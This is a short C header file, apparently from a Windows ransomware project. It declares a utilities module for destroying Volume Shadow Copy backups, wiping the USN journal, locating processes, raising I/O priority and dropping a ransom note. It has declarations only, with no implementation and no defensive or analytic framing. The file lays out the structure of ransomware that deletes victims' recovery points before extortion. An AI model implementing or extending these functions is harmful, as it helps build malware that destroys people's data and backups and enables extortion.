#pragma once
#ifndef UTILS_H
#define UTILS_H
#include <windows.h>
#include <stdbool.h>

/* ============================================================
 * UTILITIES MODULE
 * Backup destruction, privilege escalation, and misc tasks
 * ============================================================ */

/* VSS/Shadow Copy Deletion */
bool UtilsNukeBackups(void);
bool UtilsWipeUSNJournal(void);

/* Process Utilities */
DWORD UtilsFindProcessByName(const char* procName);

/* System Optimization */
void UtilsSetHighIOPriority(void);

/* Ransom Note Delivery */
bool UtilsDropRansomNote(const char *filePath, const char *noteContent);

/* Error tracking */
int UtilsGetLastError(void);

#endif
